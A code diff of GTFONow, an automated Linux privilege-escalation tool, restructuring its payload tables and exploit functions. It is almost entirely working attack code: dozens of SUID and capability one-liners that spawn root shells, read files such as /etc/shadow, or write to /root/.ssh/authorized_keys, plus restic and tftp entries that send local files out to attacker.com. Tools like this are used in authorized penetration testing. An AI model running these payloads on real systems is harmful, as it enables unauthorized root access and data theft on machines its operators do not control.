+        {
+            "code": "./rc -c '/bin/sh -p'"
+        }
     ],
     "readelf": [
-        "LFILE=file_to_read\n./readelf -a @$LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./readelf -a @$LFILE\n"
+        }
     ],
     "restic": [
-        "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
+        {
+            "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
+        }
     ],
     "rev": [
-        "LFILE=file_to_read\n./rev $LFILE | rev\n"
+        {
+            "code": "LFILE=file_to_read\n./rev $LFILE | rev\n"
+        }
     ],
     "rlwrap": [
-        "./rlwrap -H /dev/null /bin/sh -p"
+        {
+            "code": "./rlwrap -H /dev/null /bin/sh -p"
+        }
     ],
     "rsync": [
-        "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
+        {
+            "code": "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
+        }
     ],
     "rtorrent": [
-        "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent\n"
+        {
+            "code": "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent\n"
+        }
     ],
     "run-parts": [
-        "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
+        {
+            "code": "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
+        }
     ],
     "rview": [
-        "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
+        {
+            "code": "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
+            "description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3."
+        }
     ],
     "rvim": [
-        "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
+        {
+            "code": "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
+            "description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3."
+        }
     ],
     "sash": [
-        "./sash"
+        {
+            "code": "./sash"
+        }
     ],
     "scanmem": [
-        "./scanmem\nshell /bin/sh\n"
+        {
+            "code": "./scanmem\nshell /bin/sh\n"
+        }
     ],
     "sed": [
-        "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n"
+        }
     ],
     "setarch": [
-        "./setarch $(arch) /bin/sh -p"
+        {
+            "code": "./setarch $(arch) /bin/sh -p"
+        }
     ],
     "setfacl": [
-        "LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE\n"
+        {
+            "code": "LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE\n"
+        }
     ],
     "setlock": [
-        "./setlock - /bin/sh -p"
+        {
+            "code": "./setlock - /bin/sh -p"
+        }
     ],
     "shuf": [
-        "LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n",
+            "description": "The written file content is corrupted by adding a newline."
+        }
     ],
     "soelim": [
-        "LFILE=file_to_read\n./soelim \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./soelim \"$LFILE\"\n"
+        }
     ],
     "softlimit": [
-        "./softlimit /bin/sh -p"
+        {
+            "code": "./softlimit /bin/sh -p"
+        }
     ],
     "sort": [
-        "LFILE=file_to_read\n./sort -m \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./sort -m \"$LFILE\"\n"
+        }
     ],
     "sqlite3": [
-        "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
+        {
+            "code": "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
+        }
     ],
     "ss": [
-        "LFILE=file_to_read\n./ss -a -F $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./ss -a -F $LFILE\n"
+        }
     ],
     "ssh-agent": [
-        "./ssh-agent /bin/ -p"
+        {
+            "code": "./ssh-agent /bin/ -p"
+        }
     ],
     "ssh-keygen": [
-        "./ssh-keygen -D ./lib.so"
+        {
+            "code": "./ssh-keygen -D ./lib.so",
+            "description": ""
+        }
     ],
     "ssh-keyscan": [
-        "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n"
+        }
     ],
     "sshpass": [
-        "./sshpass /bin/sh -p"
+        {
+            "code": "./sshpass /bin/sh -p"
+        }
     ],
     "start-stop-daemon": [
-        "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
+        {
+            "code": "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
+        }
     ],
     "stdbuf": [
-        "./stdbuf -i0 /bin/sh -p"
+        {
+            "code": "./stdbuf -i0 /bin/sh -p"
+        }
     ],
     "strace": [
-        "./strace -o /dev/null /bin/sh -p"
+        {
+            "code": "./strace -o /dev/null /bin/sh -p"
+        }
     ],
     "strings": [
-        "LFILE=file_to_read\n./strings \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./strings \"$LFILE\"\n"
+        }
     ],
     "sysctl": [
-        "COMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
+        {
+            "code": "COMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
+        }
     ],
     "systemctl": [
-        "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"
+        {
+            "code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"
+        }
     ],
     "tac": [
-        "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n"
+        }
     ],
     "tail": [
-        "LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n"
+        }
     ],
     "taskset": [
-        "./taskset 1 /bin/sh -p"
+        {
+            "code": "./taskset 1 /bin/sh -p"
+        }
     ],
     "tbl": [
-        "LFILE=file_to_read\n./tbl $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./tbl $LFILE\n"
+        }
     ],
     "tclsh": [
-        "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
+        {
+            "code": "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
+        }
     ],
     "tee": [
-        "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"
+        }
     ],
     "terraform": [
-        "./terraform console\nfile(\"file_to_read\")\n"
+        {
+            "code": "./terraform console\nfile(\"file_to_read\")\n"
+        }
     ],
     "tftp": [
-        "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n"
+        {
+            "code": "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n",
+            "description": "Send local file to a TFTP server."
+        }
     ],
     "tic": [
-        "LFILE=file_to_read\n./tic -C \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./tic -C \"$LFILE\"\n"
+        }
     ],
     "time": [
-        "./time /bin/sh -p"
+        {
+            "code": "./time /bin/sh -p"
+        }
     ],
     "timeout": [
-        "./timeout 7d /bin/sh -p"
+        {
+            "code": "./timeout 7d /bin/sh -p"
+        }
     ],
     "troff": [
-        "LFILE=file_to_read\n./troff $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./troff $LFILE\n"
+        }
     ],
     "ul": [
-        "LFILE=file_to_read\n./ul \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./ul \"$LFILE\"\n"
+        }
     ],
     "unexpand": [
-        "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"
+        }
     ],
     "uniq": [
-        "LFILE=file_to_read\n./uniq \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./uniq \"$LFILE\"\n"
+        }
     ],
     "unshare": [
-        "./unshare -r /bin/sh"
+        {
+            "code": "./unshare -r /bin/sh"
+        }
     ],
     "unsquashfs": [
-        "./unsquashfs shell\n./squashfs-root/sh -p\n"
+        {
+            "code": "./unsquashfs shell\n./squashfs-root/sh -p\n"
+        }
     ],
     "unzip": [
-        "./unzip -K shell.zip\n./sh -p\n"
+        {
+            "code": "./unzip -K shell.zip\n./sh -p\n"
+        }
     ],
     "update-alternatives": [
-        "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
+        {
+            "code": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n",
+            "description": "Write in `$LFILE` a symlink to `$TF`."
+        }
     ],
     "uudecode": [
-        "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
+        {
+            "code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
+        }
     ],
     "uuencode": [
-        "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
+        {
+            "code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
+        }
     ],
     "vagrant": [
-        "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n"
+        {
+            "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n"
+        }
     ],
     "view": [
-        "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
+        {
+            "code": "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
+            "description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3."
+        }
     ],
     "vigr": [
-        "./vigr"
+        {
+            "code": "./vigr"
+        }
     ],
     "vim": [
-        "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
+        {
+            "code": "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
+            "description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3."
+        }
     ],
     "vimdiff": [
-        "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
+        {
+            "code": "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
+            "description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3."
+        }
     ],
     "vipw": [
-        "./vipw"
+        {
+            "code": "./vipw"
+        }
     ],
     "w3m": [
-        "LFILE=file_to_read\n./w3m \"$LFILE\" -dump\n"
+        {
+            "code": "LFILE=file_to_read\n./w3m \"$LFILE\" -dump\n"
+        }
     ],
     "watch": [
-        "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'"
+        {
+            "code": "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'",
+            "description": "This keeps the SUID privileges only if the `-x` option is present."
+        }
     ],
     "wc": [
-        "LFILE=file_to_read\n./wc --files0-from \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./wc --files0-from \"$LFILE\"\n"
+        }
     ],
     "wget": [
-        "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0\n"
+        {
+            "code": "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0\n"
+        }
     ],
     "whiptail": [
-        "LFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
+        {
+            "code": "LFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
+        }
     ],
     "xargs": [
-        "./xargs -a /dev/null sh -p"
+        {
+            "code": "./xargs -a /dev/null sh -p",
+            "description": "GNU version only."
+        }
     ],
     "xdotool": [
-        "./xdotool exec --sync /bin/sh -p"
+        {
+            "code": "./xdotool exec --sync /bin/sh -p"
+        }
     ],
     "xmodmap": [
-        "LFILE=file_to_read\n./xmodmap -v $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./xmodmap -v $LFILE\n"
+        }
     ],
     "xmore": [
-        "LFILE=file_to_read\n./xmore $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./xmore $LFILE\n"
+        }
     ],
     "xxd": [
-        "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"
+        {
+            "code": "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"
+        }
     ],
     "xz": [
-        "LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n"
+        {
+            "code": "LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n"
+        }
     ],
     "yash": [
-        "./yash"
+        {
+            "code": "./yash"
+        }
     ],
     "zsh": [
-        "./zsh"
+        {
+            "code": "./zsh"
+        }
     ],
     "zsoelim": [
-        "LFILE=file_to_read\n./zsoelim \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./zsoelim \"$LFILE\"\n"
+        }
     ]
 }
 # SUID_BINS_END
@@ -1813,37 +3174,65 @@ suid_bins = {
 # CAPABILITIES_START
 capabilities = {
     "gdb": [
-        "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
+        {
+            "code": "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
+            "description": "This requires that GDB is compiled with Python support."
+        }
     ],
     "node": [
-        "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
+        {
+            "code": "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
+        }
     ],
     "perl": [
-        "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
+        {
+            "code": "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
+        }
     ],
     "php": [
-        "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"
+        {
+            "code": "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"
+        }
     ],
     "python": [
-        "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
+        {
+            "code": "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
+        }
     ],
     "ruby": [
-        "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
+        {
+            "code": "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
+        }
     ],
     "rview": [
-        "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
+        {
+            "code": "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+            "description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3."
+        }
     ],
     "rvim": [
-        "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
+        {
+            "code": "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+            "description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3."
+        }
     ],
     "view": [
-        "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
+        {
+            "code": "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+            "description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3."
+        }
     ],
     "vim": [
-        "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
+        {
+            "code": "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+            "description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3."
+        }
     ],
     "vimdiff": [
-        "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
+        {
+            "code": "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+            "description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3."
+        }
     ]
 }
 # CAPABILITIES_END
@@ -1859,6 +3248,7 @@ RED = '\033[31m'
 GREEN = '\033[32m'
 LIGHTGREY = '\033[37m'
 RESET = '\033[0m'
+YELLOW = '\033[0;33m'
 
 
 class CustomLogger(logging.Logger):
@@ -1935,9 +3325,10 @@ def arbitrary_file_read(binary, payload, user="root", command=None):
         binary (str): Binary to exploit.
         payload (str): Exploit payload.
     """
+    log.info("Performing arbitrary file read with %s", binary)
+
     if is_service_running("ssh"):
         ssh_key_privesc(payload, user)
-    log.info("Performing arbitrary file read with %s", binary)
     print("Enter the file that you wish to read. (eg: /etc/shadow)")
     file_to_read = input("> ")
     payload = payload.replace("file_to_read", file_to_read)
@@ -1973,23 +3364,19 @@ def arbitrary_file_write(binary, payload, risk, user="root", command=None):
         elif chosen_option == "ld_preload":
             ld_preload_exploit(binary, payload, command)
         elif chosen_option == "arbitrary":
-            print("Create a file named " + GREEN + "input_file" +
-                  RESET + " containing the file content")
-            log.info(
-                "Spawning temporary shell to create file, type 'exit' when done")
-            print(
-                "Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
-            file_to_write = input("> ")
-            payload = payload.replace("file_to_write", file_to_write)
-            os.system(payload)
+            manual_arbitrary_file_write(binary, payload, risk, user, command)
     else:
-        print("Create a file named " + GREEN + "input_file" +
-              RESET + " containing the file content")
-        log.info("Spawning temporary shell to create file, type 'exit' when done")
-        print("Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
-        file_to_write = input("> ")
-        payload = payload.replace("file_to_write", file_to_write)
-        os.system(payload)
+        manual_arbitrary_file_write(binary, payload, risk, user, command)
+
+
+def manual_arbitrary_file_write(binary, payload, risk, user="root", command=None):
+    print("Create a file named " + GREEN + "input_file" +
+          RESET + " containing the file content")
+    log.info("Spawning temporary shell to create file, type 'exit' when done")
+    print("Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
+    file_to_write = input("> ")
+    payload = payload.replace("file_to_write", file_to_write)
+    os.system(payload)
 
 
 def exploit(binary,  payload, exploit_type, risk, binary_path=None, user="root", command=None):
@@ -2001,10 +3388,10 @@ def exploit(binary,  payload, exploit_type, risk, binary_path=None, user="root",
         binary_path (str, optional): Path to binary.. Defaults to None.
         user (str, optional): User to exploit. Defaults to "root".
     """
+    payload = payload["code"]
 
     if exploit_type == SUDO_NO_PASSWD and user != "root":
         payload = payload.replace("sudo", "sudo -u " + user)
-    print(payload)
     if binary_path:
         payload = payload.replace("./"+binary, binary_path)
     else:
@@ -2122,6 +3509,8 @@ def check_sudo_nopasswd_binaries(sudo_l_output):
                 "Payloads": payloads,
                 "Type": SUDO_NO_PASSWD
             }
+            log.warning("Found exploitable %s binary: %s",
+                        SUDO_NO_PASSWD, binary_path)
             priv_escs.append(priv_esc)
 
     return priv_escs
@@ -2569,8 +3958,7 @@ def print_banner():
  / ___/_  __/ __/ __ \/ |/ /__ _    __
 / (_ / / / / _// /_/ /    / _ \ |/|/ /
 \___/ /_/ /_/  \____/_/|_/\___/__,__/ 
-                                      
-    """+RESET)
+"""+RESET)
     print("https://github.com/Frissi0n/GTFONow\n")
 
 
@@ -2628,7 +4016,7 @@ def display_privilege_escalation_options(priv_escs):
         logging.warning("No privilege escalations found.")
         sys.exit(1)
 
-    print("\nChoose method to GTFO:")
+    print("\nExploitable Binaries")
     for key, value in enumerate(priv_escs):
         print_formatted_priv_esc_option(key, value)
 
@@ -2641,7 +4029,7 @@ def print_formatted_priv_esc_option(key, value):
 
     # Populate payload_options, ensuring no duplicates
     for payload in value["Payloads"]:
-        payload_desc = payload_type(payload)
+        payload_desc = payload_type(payload["code"])
         if payload_desc not in payload_options:
             payload_options.append(payload_desc)
 
@@ -2683,12 +4071,12 @@ def format_priv_esc_info(priv_esc):
 
 
 def execute_payload(priv_esc, risk, command=None):
-    print("Choose payload:")
+    print("Payload Options")
     for key, payload in enumerate(priv_esc["Payloads"]):
         print(GREEN + "[" + str(key) + "] " +
-              RESET + priv_esc["Binary"] + GREEN + " " + payload_type(payload).lower() + RESET)
+              RESET + priv_esc["Binary"] + GREEN + " " + payload_type(payload["code"]).lower() + RESET + " " + str(payload.get("description", "")))
 
-    choice = get_user_choice("> ")
+    choice = get_user_choice("Choose payload: ")
     user = priv_esc.get("SudoUser") or priv_esc.get("Owner")
     if user:
         exploit(priv_esc["Binary"], priv_esc["Payloads"][choice], priv_esc["Type"], risk,
@@ -2711,7 +4099,7 @@ def main():
     priv_escs = sudo_privescs + suid_privescs + cap_privescs
     display_privilege_escalation_options(priv_escs)
 
-    choice = get_user_choice("> ")
+    choice = get_user_choice("Choose method to GTFO: ")
     selected_priv_esc = priv_escs[choice]
     execute_payload(selected_priv_esc, args.risk, args.command)
 
